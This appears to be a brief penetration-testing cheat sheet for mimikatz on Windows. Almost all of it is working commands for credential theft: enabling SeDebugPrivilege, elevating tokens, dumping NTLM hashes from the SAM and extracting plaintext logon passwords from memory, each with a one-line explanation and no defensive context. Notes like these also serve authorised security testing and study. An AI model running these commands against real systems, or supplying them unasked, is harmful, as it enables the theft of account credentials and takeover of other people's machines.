### mimikatz
As an early stage enumeration item, worth running: `Get-LocalUser` to enumerate local users on a machine.

To start run `.\mimikatz.exe` in a Powershell session. You'll then be dumped in an interactive session in which the commands below can be run.

Enable the `SeDebugPrivilege` access right: 
```bash
privilege::debug
```
Elevate privilege (prerequisite for `lsadump::sam`):
```bash
token::elevate
```
Extract all NTLM hashes from the SAM:
```bash
lsadump::sam
```
Extract plaintext passwords from all available sources:
```bash
sekurlsa::logonpasswords
```